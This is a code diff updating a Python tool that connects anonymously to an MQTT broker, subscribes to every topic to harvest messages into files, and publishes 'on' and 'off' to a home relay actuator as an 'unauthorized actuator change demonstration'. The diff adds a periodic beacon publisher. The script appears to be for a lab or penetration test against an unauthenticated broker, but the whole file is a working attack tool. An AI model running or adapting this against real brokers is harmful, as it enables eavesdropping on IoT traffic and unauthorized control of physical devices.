@@ -1,4 +1,4 @@
-#Control Version 1.0
+#Control Version 1.1
 
 import argparse
 import sys
@@ -11,9 +11,9 @@ COLOUR_END   = '\033[0m'
 UNDERLINE    = '\033[4m'
 
 try:
-    import paho.mqtt.client as mqtt  # type: ignore[import-not-found]
+    import paho.mqtt.client as mqtt  
 except ImportError:
-    sys.exit("Error: paho-mqtt not installed. Run: sudo pip3 install paho-mqtt")
+    sys.exit(f"{ERROR} Error: paho-mqtt not installed. Run: sudo pip3 install paho-mqtt")
 
 
 class finalFile_Print:
@@ -28,21 +28,20 @@ brokerHost    = "10.10.10.40"
 brokerPort    = 1883
 harvestSecs   = 30
 actuatorTopic = "home/actuators/relay"
+beaconTopic   = "home/status/hb"
 clientID      = "kali_probe_01"
 
 topicSet = set()
 messages = []
 
-
 def on_connect(client, userdata, flags, reasonCode, properties=None):
     if reasonCode == 0:
-        print(f"{NOTIFICATION} Connected to {brokerHost}:{brokerPort} anonymously — no authentication used")
+        print(f"{NOTIFICATION} Connected to {brokerHost}:{brokerPort} anonymously: no authentication used")
         client.subscribe("#", qos=0)
-        print(f"{NOTIFICATION} Wildcard '#' subscribed — all topics will be forwarded to us")
+        print(f"{NOTIFICATION} Wildcard '#' subscribed: all topics to be forwarded.")
     else:
         print(f"{WARNING} MQTT Broker unable to connect on 1883 ({reasonCode})")
         sys.exit(1)
-
 
 def on_message(client, userdata, msg):
     ts      = time.strftime("%H:%M:%S")
@@ -53,24 +52,31 @@ def on_message(client, userdata, msg):
     topicSet.add(topic)
     messages.append((ts, topic, payload))
 
-
 def on_disconnect(client, userdata, disconnect_flags, reasonCode, properties=None):
     if reasonCode != 0:
         print(f"{WARNING} Unexpected disconnect ({reasonCode})")
-        try:
-            client.connect(brokerHost, brokerPort, keepalive=60)
-        except Exception as e:
-            print(f"{ERROR} Connection failed: {e}")
 
+def beaconChannel(client, count, interval):
+    print(f"\n{NOTIFICATION} Beacon channel on '{beaconTopic}' | ({count}, {interval}s)")
+    for i in range(1, count + 1):
+        client.publish(beaconTopic, payload=f"beacon-{i}", qos=0)
+        print(f"{NOTIFICATION} [{time.strftime('%H:%M:%S')}] beacon {i}/{count}")
+        if i < count:
+            time.sleep(interval)
+    print(f"{WARNING} Beacon complete.")
 
 def main():
     parser = argparse.ArgumentParser(description="Anonymous Mosquitto client (MQTT) probe")
     parser.add_argument("--time", type=int, default=harvestSecs,
                         help=f"Harvest duration in seconds (default: {harvestSecs})")
+    parser.add_argument("--beacon", type=int, default=0, metavar="N",
+                        help="Publish N fixed-interval beacon messages (0 disables)")
+    parser.add_argument("--beacon-interval", type=int, default=10, metavar="S",
+                        help="Seconds between beacon publishes (default: 10)")
     args = parser.parse_args()
 
     client = mqtt.Client(
-        callbackAPIVersion=mqtt.CallbackAPIVersion.VERSION2,
+        mqtt.CallbackAPIVersion.VERSION2,
         client_id=clientID,
     )
     client.on_connect    = on_connect
@@ -87,14 +93,14 @@ def main():
     client.loop_start()
 
     print(f"{NOTIFICATION} Harvesting for {args.time}s")
-    print(f"{UNDERLINE}Enter 'CTRL + C' to terminate early.{COLOUR_END}")
+    print(f"{UNDERLINE}Enter 'CTRL + C' to force termination.{COLOUR_END}")
     try:
         time.sleep(args.time)
     except KeyboardInterrupt:
         print(f"\n{WARNING} Harvest attempt forcefully terminated.")
 
     with open(finalFile_Print.harvestFile, "w") as f:
-        f.write(f"MQTT # Harvest completed — Duration: {args.time}s\n")
+        f.write(f"MQTT # Harvest completed | Duration: {args.time}s\n")
         f.write(f"# Broker: {brokerHost}:{brokerPort}\n")
         for ts, topic, payload in messages:
             f.write(f"{ts} {topic} {payload}\n")
@@ -108,6 +114,9 @@ def main():
     print(f"{NOTIFICATION} Topic data placed in {finalFile_Print.topicMap_File}")
     print(f"{NOTIFICATION} {len(topicSet)} topics discovered.")
 
+    if args.beacon > 0:
+        beaconChannel(client, args.beacon, args.beacon_interval)
+
     print(f"\n{NOTIFICATION} Unauthorized actuator change demonstration on: '{actuatorTopic}'")
     rc, mid = client.publish(actuatorTopic, payload="on", qos=0)
     if rc == mqtt.MQTT_ERR_SUCCESS:
@@ -115,13 +124,13 @@ def main():
         print(f"{NOTIFICATION} RELAY ACTIVE")
     else:
         print(f"{WARNING} Publish returned rc={rc}")
-        print(f"{UNDERLINE}Reassess broker connection before reattempting.{COLOUR_END}")
+        print(f"{UNDERLINE}Check broker connection before reattempting.{COLOUR_END}")
 
     time.sleep(2)
 
     client.publish(actuatorTopic, payload="off", qos=0)
     print(f"{NOTIFICATION} Published: {actuatorTopic} = off")
-    print(f"{WARNING} Relay reset — all changes reversed.")
+    print(f"{WARNING} Relay reset - all changes reversed.")
     time.sleep(1)
 
     client.loop_stop()
@@ -130,7 +139,6 @@ def main():
     print("\n" + "-" * 60)
     print(f"{NOTIFICATION} Probing complete.")
     print(f"Refer to {finalFile_Print()} for relevant information.")
-
 
 if __name__ == "__main__":
     main()
